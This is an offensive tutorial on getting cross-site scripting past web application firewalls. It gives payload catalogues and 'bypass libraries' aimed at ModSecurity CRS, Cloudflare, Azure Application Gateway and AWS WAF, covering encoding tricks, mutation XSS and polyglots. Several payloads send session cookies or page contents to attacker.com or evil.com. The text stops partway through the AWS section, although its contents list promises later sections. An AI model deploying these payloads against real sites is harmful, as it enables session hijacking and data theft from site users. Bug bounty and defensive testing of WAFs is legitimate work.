# XSS WAF Bypass: The Ultimate Deep Dive
## From Detection to Exploitation — Breaking Modern Web Application Firewalls


## Table of Contents

1. [Understanding the Battlefield](#1-understanding-the-battlefield)
   - [The Core Tension](#the-core-tension)
   - [Three Layers of WAF Detection](#three-layers-of-waf-detection)

2. [WAF Detection Mechanisms — How They Catch You](#2-waf-detection-mechanisms--how-they-catch-you)
   - [2.1 Signature Matching](#21-signature-matching)
   - [2.2 Normalization Pipeline](#22-normalization-pipeline)
   - [2.3 Contextual Analysis](#23-contextual-analysis)
   - [2.4 libinjection](#24-libinjection)

3. [The XSS WAF Bypass Methodology](#3-the-xss-waf-bypass-methodology)
   - [Step 1: Identify the Injection Context](#step-1-identify-the-injection-context)
   - [Step 2: Determine WAF Ruleset](#step-2-determine-waf-ruleset)
   - [Step 3: Map Allowed Characters](#step-3-map-allowed-characters)
   - [Step 4: Identify the Parser Gap](#step-4-identify-the-parser-gap)
   - [Step 5: Fuzz, Iterate, Exploit](#step-5-fuzz-iterate-exploit)

4. [Bypass Technique Catalog](#4-bypass-technique-catalog)
   - [4.1 Context-Based Bypasses](#41-context-based-bypasses)
     - [HTML Tag Context](#html-tag-context)
     - [Script Context (String Breaking)](#script-context--string-breaking)
     - [Attribute Context](#attribute-context)
     - [URL Context (HREF Breaking)](#url-context--breaking-href)
   - [4.2 Encoding & Obfuscation](#42-encoding--obfuscation)
     - [Multi-Layer Encoding](#multi-layer-encoding)
     - [Unicode Normalization Attacks](#unicode-normalization-attacks)
     - [JavaScript Obfuscation](#javascript-obfuscation)
   - [4.3 HTML/CSS Injection](#43-htmlcss-injection)
     - [CSS Expression (Legacy IE)](#css-expression-legacy-ie)
     - [Style Tag Injection](#style-tag-injection)
     - [Meta Tag Refresh](#meta-tag-refresh)
   - [4.4 Mutation XSS (mXSS)](#44-mutation-xss-mxss)
   - [4.5 DOM Clobbering & Prototype Pollution](#45-dom-clobbering--prototype-pollution)
   - [4.6 Polyglot Payloads](#46-polyglot-payloads)
   - [4.7 WAF-Specific Bypasses](#47-waf-specific-bypasses)
     - [ModSecurity CRS 3.x](#modsecurity-crs-3x-specific)
     - [Cloudflare](#cloudflare-specific)
     - [Azure Application Gateway](#azure-application-gateway-waf)
     - [AWS WAF](#aws-waf-specific)

5. [Azure Application Gateway WAF — Deep Dive](#5-azure-application-gateway-waf--deep-dive)
   - [Detection Rules That Trigger](#detection-rules-that-trigger)
   - [Proven Bypass Techniques](#proven-bypass-techniques-for-azure-waf)
     - [Inline Comment Bypass](#technique-1-inline-comment-bypass-space-replacement)
     - [Tab/Newline Injection](#technique-2-tabnewline-injection-drs-21)
     - [Data URI Bypass](#technique-3-azure-waf--data-uri)
     - [Event Handler Variations](#technique-4-event-handler-variations)
   - [Complete Azure WAF Bypass Payload Library](#complete-azure-waf-bypass-payload-library)

6. [Cloudflare WAF Bypass](#6-cloudflare-waf-bypass)
   - [Known Weaknesses](#known-cloudflare-weaknesses)
     - [Dangling Markup Injection](#dangling-markup-injection)
     - [JSON Endpoint Bypass](#json-endpoint-bypass)
     - [Worker Bypass](#worker-bypass)
   - [Cloudflare Bypass Payloads](#cloudflare-bypass-payloads)

7. [AWS WAF (CloudFront/ALB) Bypass](#7-aws-waf-cloudfrontalb-bypass)
   - [Known Gaps](#aws-waf-known-gaps)
     - [Multipart Form Bypass](#multipart-form-bypass)
     - [Base64 in Query Parameters](#base64-in-query-parameters)
     - [Null Byte Prefix](#null-byte-prefix)
   - [AWS WAF Bypass Payloads](#aws-waf-bypass-payloads)

8. [ModSecurity/CRS Bypass](#8-modsecuritycrs-bypass)
   - [CRS 3.x Rule Architecture](#crs-3x-rule-architecture)
   - [The Four Paranoia Levels](#the-four-paranoia-levels)
   - [Bypass Techniques](#crs-bypass-techniques)
     - [Encoding Stacking](#technique-1-encoding-stacking)
     - [Content-Type Confusion](#technique-2-content-type-confusion)
     - [mXSS Against CRS](#technique-3-mxss-against-crs)
     - [Request Size Exhaustion](#technique-4-request-size-exhaustion)
   - [CRS 3.x Bypass Payloads](#crs-3x-bypass-payloads)

9. [Automated Bypass Frameworks](#9-automated-bypass-frameworks)
   - [9.1 XSStrike](#91-xsstrike)
   - [9.2 PayloadsAllTheThings](#92-payloadsallthethings)
   - [9.3 WAFW00F](#93-wafw00f)
   - [9.4 Burp Suite Intruder Fuzzing](#94-custom-fuzzing-with-burp-suite-intruder)
   - [9.5 Custom Python Fuzzer (Production-Ready)](#95-custom-python-fuzzer-production-ready)

10. [Building Your Own XSS WAF Bypass Lab](#10-building-your-own-xss-waf-bypass-lab)
    - [Docker-Based WAF Testing Environment](#docker-based-waf-testing-environment)
    - [Nginx Config for AWS WAF Simulation](#nginx-config-for-aws-waf-simulation)
    - [Testing Workflow](#testing-workflow)

11. [WAF Recon Methodology](#11-waf-recon-methodology)
    - [Step 1: Identify the WAF](#step-1-identify-the-waf)
    - [Step 2: Map WAF Sensitivity](#step-2-map-waf-sensitivity)
    - [Step 3: Determine Allowed Characters](#step-3-determine-allowed-characters)

12. [Bug Bounty Workflow: XSS WAF Bypass](#12-bug-bounty-workflow-xss-waf-bypass)
    - [Phase 1: Understand the Target](#phase-1-understand-the-target-30-min)
    - [Phase 2: Identify Weak Points](#phase-2-identify-weak-points-1-hour)
    - [Phase 3: Systematic Testing](#phase-3-systematic-testing-2-hours)
    - [Phase 4: Exploit & Document](#phase-4-exploit--document-30-min)

13. [Real Bug Bounty Case Studies](#13-advanced-real-bug-bounty-case-studies)
    - [Case Study 1: Cloudflare Bypass via JSON Endpoint ($2,500)](#case-study-1-cloudflare-bypass-via-json-endpoint)
    - [Case Study 2: Azure WAF Bypass via Inline Comment ($1,500)](#case-study-2-azure-waf-bypass-via-inline-comment)
    - [Case Study 3: AWS WAF Multipart Boundary Bypass ($3,000)](#case-study-3-aws-waf-multipart-boundary-bypass)

14. [Appendices](#14-appendices)
    - [Appendix A: Universal Bypass Testing Checklist](#appendix-a-universal-bypass-testing-checklist)
    - [Appendix B: WAF Fingerprinting Quick Reference](#appendix-b-waf-fingerprinting-quick-reference)
    - [Appendix C: Blind XSS Detection Payloads](#appendix-c-blind-xss-detection-payloads)
    - [Appendix D: Cookie Theft Evasion Techniques](#appendix-d-cookie-theft-evasion-techniques)
    - [Appendix E: WAF Bypass Technique Prioritization](#appendix-e-waf-bypass-technique-prioritization)














---

## 1. Understanding the Battlefield

### The Core Tension

Every WAF sits between attacker and application, but it has a fundamental disadvantage: **the WAF must say "no" to anything it doesn't understand, while the browser and application must say "yes" to as much as possible.** This asymmetric constraint is your lever.

Modern WAFs operate at multiple layers, and understanding each is critical:

```
Layer 1: Signature-Based Detection
├── Known XSS patterns (<script>, alert(), onerror=)
├── Keyword blacklists (javascript:, onerror, alert, confirm, prompt)
└── Regex patterns matching common payloads

Layer 2: Anomaly-Based Detection
├── Request size anomalies (too large = suspicious)
├── Encoding depth anomalies (double-encoded = suspicious)
├── Parameter value entropy (too many special chars = suspicious)
└── Repeated parameter submissions (fuzzing detection)

Layer 3: Behavioral Analysis
├── Rate limiting on malicious patterns
├── Session-based scoring (multiple near-misses = block)
├── IP reputation (Cloudflare, AWS WAF, Akamai)
└── Request sequencing analysis
```

**The fundamental truth:** A WAF is a regex engine with a network interface. If you can construct input that the *application* sees differently than the *WAF*, you win.

---

## 2. WAF Detection Mechanisms — How They Catch You

### 2.1 Signature Matching

The classic approach. WAFs maintain massive signature databases ingested from commercial feeds, open-source rulesets (OWASP CRS), and in-house research. Common detection patterns:

```
Detected: <script>alert(1)</script>
Detected: <img src=x onerror=alert(1)>
Detected: javascript:alert(1)
Detected: "><script>alert(1)</script>
Detected: ';alert(1)//
Detected: {{constructor.constructor('alert(1)')()}}
```

**The trick:** Signatures are static. If you can mutate the payload while preserving its semantic meaning to the browser, the signature misses.

### 2.2 Normalization Pipeline

Every WAF normalizes input before signature matching. Understanding the pipeline order is critical:

```
Raw Input:    %3C%73%63%72%69%70%74%3E
         ↓ URL Decode
         <script>
         ↓ Case Normalization (if case-insensitive mode)
         <script>
         ↓ HTML Entity Decode
         <script>
         ↓ Unicode Normalization (NFC/NFD)
         <script>
         ↓ Signature Match → BLOCK
```

**The bypass principle:** If you can construct input that decodes to `<script>` at the browser level but survives the WAF's normalization *differently*, you win. This means finding a normalization step the WAF performs but the browser doesn't, or vice versa.

**Real-world example:** Some WAFs decode `%2F` but not `%252F` (double URL encoding). The application (if it double-decodes) sees `/` while the WAF sees `%2F`.

### 2.3 Contextual Analysis

Modern WAFs attempt to understand *where* your input appears in the HTML. This is the biggest evolution from simple regex matching:

```html
<!-- Context: Attribute value -->
<input value="INJECTION">              <!-- WAF allows quotes -->
<input value="INJECTION" onerror=...>  <!-- WAF blocks event handlers -->

<!-- Context: JavaScript string -->
<script>var x = 'INJECTION';</script>    <!-- WAF checks for '-->
<script>var x = `INJECTION`;</script>    <!-- Template literal often allowed -->

<!-- Context: URL -->
<a href="INJECTION">click</a>  <!-- WAF checks javascript: -->
```

**The key insight:** WAF context detection is imperfect. A payload that spans multiple contexts — or exploits the WAF's misidentification of context — can bypass. This is where polyglots shine.

### 2.4 libinjection

Many WAFs (including ModSecurity CRS 3.x and Cloudflare) use **libinjection** — a C library that tokenizes HTML and flags suspicious patterns. libinjection doesn't use regex; it uses a fingerprint-based approach.

```
Input: <script>alert(1)</script>
libinjection tokenizes:
TAG_OPEN_SCRIPT, TEXT, TAG_CLOSE_SCRIPT
Fingerprint: [3001, 0, 3002] → XSS flag
```

**Bypassing libinjection:** Introduce tokens that confuse the fingerprint engine. For example, namespace confusion or deeply nested tags can cause libinjection to emit a fingerprint that doesn't match known XSS patterns.

---

## 3. The XSS WAF Bypass Methodology

This is the step-by-step process I've refined across hundreds of bug bounty targets and pentests.

### Step 1: Identify the Injection Context

Before bypassing anything, you need to know what "normal" looks like:

```javascript
// Test probes to determine context
?id=test             // Reflected in HTML body? Between tags? In an attribute?
?id=<test>           // Are tags stripped? Escaped? <test> → &lt;test&gt;?
?id="test"           // Are double quotes escaped? " → &quot;?
?id='test'           // Single quotes? ' → &#x27;?
?id=test{{7*7}}      // Template engine? Server-side?
?id=${7*7}           // JS template literal? Client-side?
?id=test/*test*/     // Comment injection? Reveals backend language
```

**Pro tip:** Always URL-decode the response and inspect the raw HTML source (not rendered view). The browser hides things the WAF and server don't.

### Step 2: Determine WAF Ruleset

Probe with known patterns to map the WAF's blind spots:

```bash
# Test basic patterns - note which get blocked
<script>alert(1)</script>     # Blocked? → script tag filter
<img src=x onerror=alert(1)>  # Blocked? → event handler filter
<svg onload=alert(1)>         # Blocked? → SVG namespace check
javascript:alert(1)           # Blocked? → protocol filter
<style>@import url(x)</style> # Blocked? → CSS injection filter
```

**Each block tells you something.** Note the response status (403 vs 200 with stripped content), the error page, and any headers like `X-Security: blocked by ModSecurity`.

### Step 3: Map Allowed Characters

This is the most tedious but most revealing step:

```bash
# Systematic fuzzing - what survives to the response?
<?  <!  <#  <$  <%  <=  <[  <-  <@
```

A payload like `<%= ... %>` suggests an ASP/.NET context. `<$` suggests FreeMarker or JSP. `<%` suggests ASP. Each surviving character tells a story.

### Step 4: Identify the Parser Gap

The WAF has a parser. The browser has a parser. Your target application may have a third. Find the delta:

```
WAF parser:   Sees <script> → blocks
Browser parser: Sees <svg><script> → executes because SVG namespace allows script
Your payload: <svg><script>alert(1)</script></svg>
```

### Step 5: Fuzz, Iterate, Exploit

Once you know the parser gap, systematically mutate your payload to exploit it. The fuzzer in Section 10 automates this.

---

## 4. Bypass Technique Catalog

### 4.1 Context-Based Bypasses

#### HTML Tag Context — Breaking Out

```html
<!-- Technique: Unclosed tag with auto-triggering attribute -->
<input value="INJECTION" onfocus=alert(1) autofocus>
<!-- No closing quote needed; onfocus fires when element receives focus -->

<!-- Technique: SVG namespace confusion -->
<svg><script>alert(1)</script></svg>
<!-- WAF blocks <script> in HTML context
     Browser allows <script> inside <svg> (SVG namespace)
     Parser gap exploited -->

<!-- Technique: Self-closing SVG -->
<svg/onload=alert(1)>
<!-- Valid SVG; the '/' closes the tag, onload fires -->
```

#### Script Context — String Breaking

```javascript
// Context: <script>var x = 'INJECTION';</script>

// Bypass 1: Close string, inject code, comment out rest
';alert(1);//

// Bypass 2: Template literal (ES6+)
${alert(1)}
// WAF sees $ as suspicious but template literals are valid JS

// Bypass 3: Unicode line separator (U+2028) bypasses newline filters
'%E2%80%A8alert(1)//
// U+2028 is a valid line terminator in JS but many WAFs don't normalize it

// Bypass 4: Backtick + expression
`${alert(1)}`
```

#### Attribute Context

```html
<!-- Context: <div class="INJECTION"> -->

<!-- Bypass: Space-less event handler (no space before onmouseover) -->
"onmouseover="alert(1)
<!-- WAF expects " onmouseover= (with space) -->

<!-- Bypass: Tab/Newline instead of space -->
"onload
="alert(1)
<!-- Newline is valid whitespace in HTML attributes -->

<!-- Bypass: No equals sign needed in some parsers -->
"autofocus"onfocus="alert(1)
<!-- autofocus has no value; onfocus triggers immediately -->

<!-- Bypass: Attribute minimization -->
"onfocus=alert(1) x="
<!-- x is a new attribute with no value; payload completes the injection -->
```

#### URL Context — Breaking HREF

```html
<!-- Context: <a href="INJECTION">click</a> -->

<!-- Technique: Protocol bypass -->
//attacker.com/steal?c=
<!-- Protocol-relative URL; WAF doesn't see javascript: -->

<!-- Technique: Data URI bypass -->
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==

<!-- Technique: Unicode normalization -->
javascript&#58;alert(1)
<!-- &#58; = colon; some WAFs don't unescape entities in URL context -->

<!-- Technique: Tab in protocol -->
java&#09;script:alert(1)
<!-- Tab between java and script bypasses string match -->
```

### 4.2 Encoding & Obfuscation

#### Multi-Layer Encoding

This is the most practical bypass for production WAFs. The key insight is that **encoding depth** matters:

```html
<!-- The WAF decodes once, the browser/app decodes again -->

<!-- Double URL encoding -->
%253Cscript%253Ealert(1)%253C/script%253E
%25 = %
%3C = <
%25%33%43 = %3C → < (after second decode)
WAF decodes once: %3Cscript%3E (not malicious)
App decodes twice: <script>alert(1)</script> (executes)

<!-- Triple encoding for paranoid WAFs -->
%25253Cscript%25253Ealert(1)%25253C/script%25253E

<!-- Mixed encoding (URL + HTML entity) -->
&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;alert(1)&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;
<!-- HTML entities decoded by browser, not by WAF's URL decoder -->
```

**Real-world example against Azure WAF:**

```http
GET /search?q=%253Csvg%2520onload%253Dalert(1)%253E HTTP/1.1
Host: target.azurewebsites.net

Azure WAF decodes: %3Csvg%20onload%3Dalert(1)%3E (safe - no tags)
App decodes again: <svg onload=alert(1)> (XSS)
```

#### Unicode Normalization Attacks

Unicode is the gift that keeps giving for WAF bypass:

```html
<!-- Unicode fullwidth characters bypass ASCII filters -->
＜script＞alert(1)＜/script＞
<!-- Fullwidth chars: U+FF1C (<), U+FF1E (>) -->
<!-- WAF sees ASCII <, >; browser normalizes fullwidth to regular -->

<!-- Combining characters -->
<script>ale&#x72;t(1)</script>
<!-- r = 0x72; browser normalizes HTML entity inside script text -->

<!-- Zero-width characters for keyword breaking -->
jav\x00ascript:alert(1)
<!-- Null byte breaks the word "javascript" for the WAF
     Browser ignores null bytes in most contexts -->

<!-- Unicode homoglyphs -->
<script>аlert(1)</script>
<!-- Cyrillic 'а' (U+0430) looks identical to Latin 'a' (U+0061)
     WAF checks for "alert" - doesn't find it
     Browser interprets Cyrillic 'а' as part of identifier name */
```

**Critical caveat:** Unicode bypasses work best against older WAFs. Modern WAFs (Cloudflare, AWS WAF managed rules v2+, Azure DRS 2.1+) normalize Unicode more aggressively. Always test.

#### JavaScript Obfuscation

When the WAF blocks keywords like `alert`, `document.cookie`, or `eval`, obfuscation reconstructs these at runtime:

```javascript
// Technique: String.fromCharCode
String.fromCharCode(97,108,101,114,116,40,49,41)
// Returns: "alert(1)"

// Technique: Atob decoding (base64)
eval(atob('YWxlcnQoMSk='))
// atob decodes base64 to "alert(1)", eval executes it

// Technique: Hex escape
eval('\x61\x6c\x65\x72\x74\x28\x31\x29')
// Hex escapes decode to "alert(1)"

// Technique: Unicode escape
eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029')
// Same concept, unicode encoding

// Technique: Callback substitution (no eval needed)
[].constructor.constructor('alert(1)')()
// [] is Array, .constructor is Array constructor
// .constructor.constructor is Function constructor
// Function('alert(1)')() → executes

// Technique: Global variable access with bracket notation
self['\x61\x6c\x65\x72\x74'](1)
window['ale'+'rt'](1)

// Technique: Eval through error handling (no eval keyword)
try{x}catch(e){e.constructor.constructor('alert(1)')()}
// Error object's constructor is Error, its constructor is Function
// Function('alert(1)')() → executes
```

**Bug bounty tip:** WAFs often block `eval(` but forget about `Function(`, `setTimeout(`, `setInterval(`, and constructor chains. These are equally dangerous and often overlooked:

```javascript
// These all execute the string as code:
setTimeout('alert(1)')
setInterval('alert(1)')
Function('alert(1)')()
setImmediate('alert(1)')  // Node.js/IE
```

### 4.3 HTML/CSS Injection

CSS-based XSS is often overlooked in modern testing but can be devastating:

#### CSS Expression (Legacy IE)

```html
<!-- IE-specific: CSS expressions execute JavaScript -->
<style>body{x:expression(alert(1))}</style>
<!-- Only works in IE < 8 (which still exists in many enterprise environments) -->
```

#### Style Tag Injection

```html
<!-- Technique: @import with javascript: URL -->
<style>@import url('javascript:alert(1)');</style>
<!-- Works in some older browsers -->

<!-- Technique: Background URL with JS -->
<div style="background:url('javascript:alert(1)')">

<!-- Technique: Behavior URL (IE-specific) -->
<div style="behavior:url('javascript:alert(1)')">

<!-- Technique: CSS animation + JS interaction -->
<style>
@keyframes x{from{color:red}}
input:focus{animation:x}
</style>
<input onfocus=alert(1) autofocus>
<!-- CSS triggers focus, onfocus fires -->
```

#### Meta Tag Refresh

```html
<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
<!-- The meta refresh directive with javascript: is powerful
     Many WAFs only check <a href> and <script> for javascript:
     They miss <meta> entirely -->
```

### 4.4 Mutation XSS (mXSS)

**This is the most powerful modern bypass technique.** The principle: the WAF validates the input as one DOM tree, but the browser's innerHTML parser renders a *different* DOM tree — and the second tree contains executable XSS.

The WAF cannot simulate all possible browser parsers. This asymmetry is the heart of mXSS.

```html
<!-- Technique 1: noscript mutation -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
<!--
WAF parses: <noscript><p title="</noscript> → NO script/event handler = SAFE
Browser parses:
  <noscript> is a raw text element
  <p title="…"> captures the text
  </noscript> closes the noscript
  <img src=x onerror=alert(1)> → This tag now exists in the DOM
  "> → stray text
-->

<!-- Technique 2: InnerHTML mutation -->
<!-- Input to innerHTML: -->
<table><p id=x></table>
<!-- Browser sees: <table></table><p id=x></p> (table closes before p) -->

<!-- Now if innerHTML sets: -->
<div id=x><script>alert(1)</script></div>
<!-- But p#x already exists in DOM, so innerHTML reparents differently -->
```

**Real-world mXSS variant that worked against Cloudflare (2023):**

```html
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
```

This exploits the interaction between MathML, table, and style elements — the WAF sees one tree, Chrome renders another.

#### Why mXSS is Hard to Detect

The WAF would need to:
1. Maintain DOM parsers for every browser version
2. Simulate innerHTML for every possible mutation scenario
3. Validate against the *rendered* DOM, not the *source* HTML

No WAF does this comprehensively. That's why mXSS bypasses even the strictest configurations.

### 4.5 DOM Clobbering & Prototype Pollution

These techniques don't inject executable code directly. Instead, they manipulate the environment that existing code relies on.

#### DOM Clobbering

```html
<!-- Scenario: A page has JS code that does:
     var win = window.open('', 'defaultView');
     win.location.href = something;
-->

<!-- We inject: -->
<a id="defaultView"><a id="defaultView" name="href" href="javascript:alert(1)">

<!-- Now:
     window.defaultView → returns HTMLAnchorElement (not a Window)
     window.defaultView.href → returns "javascript:alert(1)"
     If the code assigns window.defaultView.href to something, it gets our payload
-->
```

This works because `window.defaultView` resolves to an element with `id="defaultView"` instead of the expected Window object. The browser's named access on the Window object can be clobbered by elements with matching IDs.

#### Prototype Pollution

```javascript
// Server sends: {"__proto__": {"url": "javascript:alert(1)"}}

// If the app does: var config = JSON.parse(input);
// Then: config.__proto__.url = "javascript:alert(1)"
// All objects now have url property polluted

// Later: window.location = someObj.url
// someObj.url → falls back to polluted prototype → "javascript:alert(1)"
```

**Bug bounty angle:** Prototype pollution is frequently file under "won't fix" by security teams, but combined with XSS it becomes a critical chain. Look for:
- Express body parser `{extended: true}` setting
- jQuery `$.extend()` or `$.merge()`
- Object.assign or lodash merge patterns
- Any recursive merge in the codebase

### 4.6 Polyglot Payloads

A polyglot payload works across multiple injection contexts simultaneously. This is critical when you don't know exactly where your input lands, or when the WAF's context detection is confused.

```html
<!-- Polyglot 1: HTML + JS + URL -->
javascript:/*--></title></style></script></textarea><svg onload=alert(1)>
<!-- This works in:
     - <a href="…">
     - <script>…</script>
     - <textarea>…</textarea>
     - <title>…</title>
     - HTML body
-->

<!-- Polyglot 2: Multi-context trigger -->
'"`><img src=x onerror=alert(1)>
<!--
  '"` closes single quotes, double quotes, or template literals
  > closes any open HTML tag
  <img src=x onerror=alert(1)> executes the XSS
-->

<!-- Polyglot 3: Comment-based -->
--><script>alert(1)</script>
<!-- Works inside:
     <!-- HTML comments -->
     /* CSS/JS comments */
     -- SQL comments (if in SQL context)
-->

<!-- Polyglot 4: JSON + HTML hybrid -->
{"input": "</script><svg onload=alert(1)>"}
<!-- If JSON is embedded in HTML via <script> tags:
     <script>var data = {"input": "</script><svg onload=alert(1)>"}</script>
     The </script> string breaks out of the script tag
     <svg onload=alert(1)> executes
-->
```

**The ultimate polyglot tester:** Send every payload wrapped in `'"`> and watch what survives. This catches most contexts in one shot.

### 4.7 WAF-Specific Bypasses

#### ModSecurity CRS 3.x Specific

```html
<!-- Bypass 942110 (SQLI / XSS common injection) -->
<details open ontoggle=alert(1)>
<!-- CRS 942110 checks common injection patterns
     details/ontoggle is less common than onload/onerror -->

<!-- Bypass 941110 (script tag) -->
<svg onload=alert(1)>
<!-- SVG namespace allows event handlers, CRS checks script tag -->

<!-- Bypass 941120 (event handler) -->
<details open ontoggle=eval(name)>
<!-- eval(name) doesn't match alert|prompt|confirm signature
     name is window.name (URL bar content) - attacker controlled -->

<!-- Bypass request body inspection -->
# Use GET instead of POST - many CRS deployments don't inspect GET body
# Or: Content-Type: multipart/form-data boundary confusion
# Or: Content-Type: application/json (CRS skips JSON)
```

#### Cloudflare Specific

```html
<!-- Bypass: Dangling markup -->
<img src="https://attacker.com/steal?data=
<!-- No closing quote; everything after becomes part of the src attribute
     Cloudflare's regex looks for complete tags with closing quotes
     Dangling markup isn't a complete tag → not blocked
     But the browser still sends the request to the dangling URL -->

<!-- Bypass: Data URI variations -->
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<!-- Cloudflare often blocks data:text/html, but misses:
     data:text/html;charset=utf-8;base64,…
     data:text/html;charset=iso-8859-1;base64,…
-->

<!-- Bypass: JSON endpoint bypass -->
<!-- Cloudflare WAF doesn't always inspect JSON request bodies -->
POST /api/submit
Content-Type: application/json

{"input": "<script>alert(1)</script>"}
```

#### Azure Application Gateway WAF

```html
<!-- Technique: Inline comment as space replacement -->
<svg/**/onload=alert(1)>
<!-- Azure's CRS 3.2 doesn't normalize /**/ to space before checking
     Browser sees: <svg onload=alert(1)> (space) -->

<!-- Technique: Tab injection (most reliable against Azure DRS 2.1+) -->
<svg%09onload=alert(1)>

<!-- Technique: Event handler variations Azure doesn't block -->
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
```

#### AWS WAF Specific

```html
<!-- Multipart form bypass -->
POST / HTTP/1.1
Content-Type: multipart/form-data; boundary=----BOUNDARY

------BOUNDARY
Content-Disposition: form-data; name="input"

<img src=x onerror=alert(1)>
------BOUNDARY--

<!-- AWS WAF inspects URL-encoded and text/plain body types
     Multipart form-data inspection is weaker -->

<!-- Base64 in query parameters -->
/?input=PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
<!-- If the backend decodes base64, the WAF never sees the raw payload -->

<!-- Unclosed tag bypass -->
<img src=x onerror=alert(1)
<!-- No closing >; AWS WAF sometimes looks for complete tags -->
```

---

## 5. Azure Application Gateway WAF — Deep Dive

Microsoft's Azure WAF runs on the Application Gateway and is based on CRS 3.2 (older deployments) or DRS 2.1+ (newer deployments). It's widely deployed in enterprise Azure environments.

### Detection Rules That Trigger

| Rule ID | Pattern | Block Trigger |
|---------|---------|---------------|
| 941110 | `<script>` | Any script tag |
| 941120 | `onerror=` | Event handler with equals |
| 941150 | `javascript:` | Protocol-based XSS |
| 941160 | `alert(` | Function call patterns |
| 942110 | `' OR 1=1--` | SQLi / XSS common |

### Proven Bypass Techniques for Azure WAF

#### Technique 1: Inline Comment Bypass (Space Replacement)

This is Azure's most famous weakness. Replace every space with `/**/`:

```html
<svg/**/onload=alert(1)>
<img/**/src=x/**/onerror=alert(1)>
<details/**/open/**/ontoggle=alert(1)>
<svg/**/onload=location='//attacker.com/'+document.cookie>
```

**Why it works:** Azure's CRS 3.2 normalizes input but doesn't strip `/**/` style comments before checking tokens. The browser sees:

```
<svg onload=alert(1)>  (/**/ becomes a space)
```

#### Technique 2: Tab/Newline Injection (DRS 2.1+)

Azure's newer DRS 2.1 strips `/**/` but doesn't always handle encoded whitespace:

```html
<svg%09onload=alert(1)>     <!-- Tab (U+0009) -->
<svg%0aonload=alert(1)>     <!-- Newline (U+000A) -->
<svg%0donload=alert(1)>     <!-- Carriage return (U+000D) -->
```

#### Technique 3: Azure WAF + Data URI

```html
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```

**Why:** Azure blocks `javascript:` but doesn't block `data:` URIs with equal rigor. The iframe with a base64-encoded XSS page executes without crossing the `javascript:` protocol filter.

#### Technique 4: Event Handler Variations

```html
<!-- Azure doesn't block all event handlers equally -->
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<input autofocus onfocus=alert(1)>
<body onload=alert(1)>
```

### Complete Azure WAF Bypass Payload Library

```html
<!-- Reflected XSS -->
?q=<svg/**/onload=alert(1)>
?q=<img/**/src=x/**/onerror=alert(1)>
?q="><svg/**/onload=alert(1)>
?q='><svg/**/onload=alert(1)>
?q=%22%3E%3Csvg/**/onload=alert(1)%3E

<!-- Stored XSS -->
<details/**/open/**/ontoggle=confirm`1`>
<svg/**/onload=location='//attacker.com/'+document.cookie>
<img/**/src=x/**/onerror=eval(atob('YWxlcnQoMSk='))>

<!-- Blind XSS -->
"><script/**/src=//attacker.com/xss.js></script>
"><img/**/src=//attacker.com/steal?c=document.cookie
```

---

## 6. Cloudflare WAF Bypass

Cloudflare runs the most widely deployed commercial WAF. Their detection is regex-heavy but augmented with ML-based scoring on paid plans.

### Known Cloudflare Weaknesses

#### Dangling Markup Injection

```html
<!-- Cloudflare doesn't block dangling markup -->
<img src="https://attacker.com/steal?data=
<!-- No closing " means the tag is incomplete
     WAF sees: incomplete tag = safe
     Browser sees: sends GET request to the dangling URL with all following content as query parameter
     
     If the page content after injection includes:
     ...session=abc123_token...
     The browser sends: GET /steal?data=...session=abc123_token
-->
```

**Why this matters:** Dangling markup bypasses *all* WAFs because the tag isn't valid HTML — there's nothing to match against. It's particularly effective for stealing CSRF tokens and session identifiers from the same page.

#### JSON Endpoint Bypass

```javascript
// Cloudflare WAF often skips JSON content types entirely
fetch('/api/submit', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({input: '<script>alert(1)</script>'})
})
```

**Cloudflare philosophy:** Cloudflare inspects `application/x-www-form-urlencoded` and `multipart/form-data` aggressively. JSON endpoints are often left at "low sensitivity" or bypassed entirely. If you find a JSON API that reflects input into HTML, you've found a Cloudflare bypass.

#### Worker Bypass

```html
<!-- If Cloudflare Workers are configured on the zone
     Worker-to-origin parsing differences can be exploited -->

<!-- Example: Worker decodes URL differently than origin -->
/?input=%25253Cscript%25253Ealert(1)%25253C/script%25253E
<!-- Worker might decode once, pass to origin, origin decodes again -->
```

### Cloudflare Bypass Payloads

```html
<!-- SVG XSS (bypasses Cloudflare's script tag filter) -->
<svg onload=alert(1)>
<svg onload=location='//evil.com/'+document.cookie>

<!-- Details/ontoggle (less common event handler) -->
<details open ontoggle=alert(1)>

<!-- Tab-based bypass -->
<svg%09onload=alert(1)>

<!-- Form action bypass -->
<form action="javascript:alert(1)"><input type=submit>

<!-- Data URI bypass (cloudflare blocks data:text/html but not all variants) -->
<iframe srcdoc="<img src=x onerror=alert(1)>">
<!-- srcdoc is often less inspected than src -->

<!-- noscript with injected content (mXSS against Cloudflare) -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

---

## 7. AWS WAF (CloudFront/ALB) Bypass

AWS WAF uses managed rule groups from AWS (AWSManagedRulesCommonRuleSet, SQLiRuleSet, XSSRuleSet) that are updated regularly.

### AWS WAF Known Gaps

#### Multipart Form Bypass

```http
POST / HTTP/1.1
Content-Type: multipart/form-data; boundary=----BOUNDARY

------BOUNDARY
Content-Disposition: form-data; name="input"

<img src=x onerror=alert(1)>
------BOUNDARY--
```

AWS WAF's multipart inspection is weaker than its URL-encoded body inspection. The multipart boundary creates parsing challenges.

#### Base64 in Query Parameters

```
/?input=PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

If the backend decodes this before rendering (common in Node.js, Python, Java apps), the WAF never sees the decoded payload.

#### Null Byte Prefix

```html
%00<script>alert(1)</script>
```

